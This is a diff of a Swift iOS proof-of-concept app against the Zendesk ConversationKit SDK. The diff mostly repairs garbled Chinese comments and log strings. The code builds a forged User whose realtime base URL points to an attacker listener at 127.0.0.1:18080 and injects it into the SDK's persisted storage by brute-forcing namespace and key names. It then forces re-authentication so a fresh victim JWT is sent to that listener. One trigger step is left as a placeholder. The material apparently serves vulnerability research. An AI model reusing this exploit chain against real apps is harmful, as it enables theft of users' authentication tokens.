@@ -1,6 +1,6 @@
-// AppDelegate.swift â i316 å®æ´æ¼ç¤º app (Stage B: çå®éæ + å¨é¾æ¡)
+// AppDelegate.swift — i316 完整演示 app (Stage B: 真实集成 + 全链条)
 //
-// ææ API å½¢ç¶åæåèª tag 15.2.0 swiftinterface (æºç çº§æå¨):
+// 所有 API 形状均提取自 tag 15.2.0 swiftinterface (源码级权威):
 //   Config(appId:baseURL:settingsBaseURL:integrationId:region:restRetryPolicy:waitTimeConfig:sdkVersion:brandId:)
 //   RestRetryPolicy.default / WaitTimeConfig(waitTimeEnabled:...)
 //   DefaultConversationKitBuilder().setup(authDelegate:) / build(with:callbackQueue:)
@@ -8,15 +8,15 @@
 //   ConversationKitEvent.messageReceived / persistedUserRetrieved / connectionStatusChanged / userSessionReset
 //   AuthenticationDelegate.onInvalidAuth(error:completion:)
 //
-// å·²ç¥é£é©ç¹ (é¦æ¬¡ CI ç¼è¯è¥æ¥é, éæ¡æ log ä¿®æ­£):
-//   R1: FeatureFlagManager() ç init å½¢ç¶æªè§ interface â è¥ç¼è¯å¤±è´¥ææ¥éæ¹
-//   R2: baseURL/settingsBaseURL çå®å¼ç±ä¸å± Messaging SDK å³å® â Info.plist å¡«çå®ç«¯ç¹
+// 已知风险点 (首次 CI 编译若报错, 逐条按 log 修正):
+//   R1: FeatureFlagManager() 的 init 形状未见 interface — 若编译失败按报错改
+//   R2: baseURL/settingsBaseURL 真实值由上层 Messaging SDK 决定 — Info.plist 填真实端点
 
 import UIKit
 import ZendeskSDKConversationKit
 import ZendeskSDKStorage
 
-// MARK: - åå®³è JWT (åå®¶åç«¯å¨çå®åºæ¯ç­¾å; PoC æ¬å°çæå³å¯ â æä»¬åªéªè¯"åå°åª")
+// MARK: - 受害者 JWT (商家后端在真实场景签发; PoC 本地生成即可 — 我们只验证"发到哪")
 
 enum VictimJWT {
     static func make() -> String {
@@ -28,12 +28,12 @@ enum VictimJWT {
     }
 }
 
-// MARK: - æä¹åæ³¨å¥ (çå®æ»å»è·¯å¾: f248 è¦ååçæä¹åç¶æ = æ­¤å¤ç´æ¥åå¥)
-// SDK äºè¿å¶å®é¤é®æ: com.zendesk.conversationKit-User- / com.zendesk.conversationKit
-// StorageBuilder(namespace:type:) / Storage.set(_:forKey:) â Codable éé
+// MARK: - 持久化注入 (真实攻击路径: f248 覆写后的持久化状态 = 此处直接写入)
+// SDK 二进制实锤键族: com.zendesk.conversationKit-User- / com.zendesk.conversationKit
+// StorageBuilder(namespace:type:) / Storage.set(_:forKey:) — Codable 通道
 
 enum PersistedUserInjector {
-    /// åé namespace Ã key ç»å â persistedUserRetrieved äºä»¶å½ä¸­å³è¯ææ³¨å¥æå
+    /// 候选 namespace × key 组合 — persistedUserRetrieved 事件命中即证明注入成功
     static func injectForgedUser(_ user: User, log: @escaping (String) -> Void) {
         let namespaces = ["conversationKit", "com.zendesk.conversationKit", "conversationKitStorage"]
         let keys = ["user", "User", "currentUser", "user_state", "state"]
@@ -44,7 +44,7 @@ enum PersistedUserInjector {
                         let storage = try StorageBuilder(namespace: ns, type: st).build()
                         storage.set(user, forKey: "com.zendesk.conversationKit-User-" + key)
                         log("   injected: ns=\(ns) type=\(st) key=com.zendesk.conversationKit-User-\(key)")
-                    } catch { /* ç»§ç»­ä¸ä¸ç»å */ }
+                    } catch { /* 继续下一组合 */ }
                 }
             }
         }
@@ -53,14 +53,14 @@ enum PersistedUserInjector {
 
 final class AuthDelegate: NSObject, AuthenticationDelegate {
     weak var ui: DemoVC?
-    // SDK 401/è®¤è¯å¤±è´¥æ¶è°ç¨ â completion éç JWT ä¼è¢«åå¾ (å¯è½å·²è¢«æ±¡æç) realtimeSettings.baseURL
+    // SDK 401/认证失败时调用 — completion 里的 JWT 会被发往 (可能已被污染的) realtimeSettings.baseURL
     func onInvalidAuth(error: Error?, completion: @escaping (String) -> Void) {
-        ui?.log("â¤ onInvalidAuth è§¦å â æä¾ fresh victim JWT")
+        ui?.log("⑤ onInvalidAuth 触发 → 提供 fresh victim JWT")
         completion(VictimJWT.make())
     }
 }
 
-// MARK: - æ¼ç¤ºä¸»æ§å¶å¨
+// MARK: - 演示主控制器
 
 @main
 final class AppDelegate: UIResponder, UIApplicationDelegate {
@@ -83,8 +83,8 @@ final class AppDelegate: UIResponder, UIApplicationDelegate {
     private func startKit(vc: DemoVC) {
         let attackerBase = "http://127.0.0.1:18080"
 
-        // â  æé ä¼ªé  User (realtimeSettings.baseURL â æ»å»è) â f248 è¦ååçæä¹åç¶æç­ä»·ç©
-        vc.log("â  æé ä¼ªé  User (realtimeSettings.baseURL â \(attackerBase))")
+        // ① 构造伪造 User (realtimeSettings.baseURL → 攻击者) — f248 覆写后的持久化状态等价物
+        vc.log("① 构造伪造 User (realtimeSettings.baseURL → \(attackerBase))")
         let forgedUserJSON = """
         {"id":"u1","givenName":"Victim","surname":"Alice","email":"v@poc","locale":"en",
          "externalId":"victim-uid-42",
@@ -94,13 +94,13 @@ final class AppDelegate: UIResponder, UIApplicationDelegate {
          "authentication":{"type":1,"token":"stale-token"}}
         """
         let forged = try! JSONDecoder().decode(User.self, from: Data(forgedUserJSON.utf8))
-        vc.log("â¡ forged User decoded via SDK Codable éé (User.init(from:))")
+        vc.log("② forged User decoded via SDK Codable 通道 (User.init(from:))")
 
-        // â¢ æ³¨å¥æä¹åå­å¨ â å¿é¡»åçå¨ SDK åå§åä¹å (SDK å¯å¨æ¶è¯»æä¹åç¶æ)
-        vc.log("â¢ æ³¨å¥æä¹åå­å¨ (StorageBuilder, åéé®æ) â¦")
+        // ③ 注入持久化存储 — 必须发生在 SDK 初始化之前 (SDK 启动时读持久化状态)
+        vc.log("③ 注入持久化存储 (StorageBuilder, 候选键族) …")
         PersistedUserInjector.injectForgedUser(forged) { s in vc.log(s) }
 
-        // â£ åå§å SDK â è§å¯ persistedUserRetrieved æ¯å¦å½ä¸­ä¼ªé  User
+        // ④ 初始化 SDK — 观察 persistedUserRetrieved 是否命中伪造 User
         func plist(_ key: String) -> String { (Bundle.main.infoDictionary?[key] as? String) ?? "REPLACE_ME" }
         let config = Config(
             appId: plist("ZDK_APP_ID"),
@@ -117,40 +117,40 @@ final class AppDelegate: UIResponder, UIApplicationDelegate {
 
         let builder = DefaultConversationKitBuilder()
         builder.setup(authDelegate: authDelegate)
-        vc.log("â£ builder.setup(authDelegate:) â ä¸çå®åå®¶ app éææ¹å¼ä¸è´")
+        vc.log("④ builder.setup(authDelegate:) — 与真实商家 app 集成方式一致")
 
         let params = SettingsParameters(config: config,
-                                        featureFlagManager: FeatureFlagManager())   // é£é©ç¹ R1
+                                        featureFlagManager: FeatureFlagManager())   // 风险点 R1
         kit = builder.build(with: params, callbackQueue: .main)
-        vc.log("â¤ kit built â ç­å¾ persistedUserRetrieved / è¿æ¥äºä»¶")
+        vc.log("⑤ kit built — 等待 persistedUserRetrieved / 连接事件")
 
-        // resume æé®: è§¦å realtime éè¿ (re-auth è·¯å¾)
+        // resume 按钮: 触发 realtime 重连 (re-auth 路径)
         vc.onResumeHook = { [weak kit] in
             kit?.pause()
             kit?.resume()
         }
 
-        // äºä»¶è§å¯ â persistedUserRetrieved ç´æ¥å±ç¤º"SDK ä»æä¹åå è½½ User"
+        // 事件观察 — persistedUserRetrieved 直接展示"SDK 从持久化加载 User"
         kit?.addEventObserver(self) { [weak vc] event in
             guard let vc else { return }
             switch event {
             case .persistedUserRetrieved(let user):
-                vc.log("â persistedUserRetrieved: id=\(user.id) realtime.baseURL=\(user.realtimeSettings.baseURL)")
+                vc.log("★ persistedUserRetrieved: id=\(user.id) realtime.baseURL=\(user.realtimeSettings.baseURL)")
                 if user.realtimeSettings.baseURL.contains("127.0.0.1") {
-                    vc.log("âââ æ³¨å¥å½ä¸­! SDK å è½½äºè¢«æ±¡æç User â realtime å°è¿åæ»å»è")
+                    vc.log("★★★ 注入命中! SDK 加载了被污染的 User — realtime 将连向攻击者")
                 }
             case .connectionStatusChanged(let s):
-                vc.log("Â· connection: \(s)")
+                vc.log("· connection: \(s)")
             case .userSessionReset:
-                vc.log("Â· userSessionReset")
+                vc.log("· userSessionReset")
             default: break
             }
         }
-        vc.log("â¥ è§å¯èå°±ç»ª â ç­å¾å¤å¸¦ (çå¬å¨å¨ 127.0.0.1:18080)")
+        vc.log("⑥ 观察者就绪 — 等待外带 (监听器在 127.0.0.1:18080)")
     }
 }
 
-// MARK: - æç® UI: æ­¥éª¤æ¥å¿ + éä»¶ç¹å» + æå¨è§¦å re-auth
+// MARK: - 极简 UI: 步骤日志 + 附件点击 + 手动触发 re-auth
 
 final class DemoVC: UIViewController {
     private let logView = UITextView()
@@ -168,11 +168,11 @@ final class DemoVC: UIViewController {
         logView.textColor = .green
         logView.font = .monospacedSystemFont(ofSize: 12, weight: .regular)
         logView.isEditable = false
-        logView.text = "i316 PoC â ZendeskSDKConversationKit\n\n"
+        logView.text = "i316 PoC — ZendeskSDKConversationKit\n\n"
         view.addSubview(logView)
 
-        configBtn(attachBtn, title: "ç¹å»éä»¶ (è§¦å f248 é¾)", y: view.bounds.height - 150, enabled: false)
-        configBtn(resumeBtn, title: "pause+resume (è§¦å re-auth)", y: view.bounds.height - 90, enabled: true)
+        configBtn(attachBtn, title: "点击附件 (触发 f248 链)", y: view.bounds.height - 150, enabled: false)
+        configBtn(resumeBtn, title: "pause+resume (触发 re-auth)", y: view.bounds.height - 90, enabled: true)
     }
 
     private func configBtn(_ b: UIButton, title: String, y: CGFloat, enabled: Bool) {
@@ -205,20 +205,20 @@ final class DemoVC: UIViewController {
 
     @objc private func onTap(_ sender: UIButton) {
         if sender === attachBtn, let file = pendingFile {
-            log("â¥ ç¹å»éä»¶ â è§¦å SDK éä»¶å¤çé¾ (f248) â¦")
-            // âââ f248 è§¦åç¹: æä½ æ¥åä¸­ f248 ç« èçè°ç¨è·¯å¾å¡«å¥ â
-            //     å³ SDK å¯¹è¯¥ mediaURL/attachmentId çåé¨å¤çå¥å£ã
-            //     è¦åæåå SDK ä¸æ¬¡ re-auth ä¼æ fresh JWT åå¾è¢«æ±¡æç
-            //     realtimeSettings.baseURL (runner çå¬å¨æè·)ã
+            log("⑥ 点击附件 → 触发 SDK 附件处理链 (f248) …")
+            // ↓↓↓ f248 触发点: 按你报告中 f248 章节的调用路径填入 —
+            //     即 SDK 对该 mediaURL/attachmentId 的内部处理入口。
+            //     覆写成功后 SDK 下次 re-auth 会把 fresh JWT 发往被污染的
+            //     realtimeSettings.baseURL (runner 监听器捕获)。
             processAttachmentTrigger(file)
         } else if sender === resumeBtn {
-            log("â¥ pause()+resume() â SDK éå»º realtime è¿æ¥ (re-auth) â¦")
+            log("⑥ pause()+resume() → SDK 重建 realtime 连接 (re-auth) …")
             onResumeHook?()
         }
     }
 
     private func processAttachmentTrigger(_ file: FileMessageContent) {
-        // å ä½: ç±ä½ ææ¥å f248 ç« èå¡«å¥çå®è§¦åè°ç¨
-        log("   (å¾å¡«: f248 è§¦åè°ç¨ â è§æ¥å)")
+        // 占位: 由你按报告 f248 章节填入真实触发调用
+        log("   (待填: f248 触发调用 — 见报告)")
     }
 }
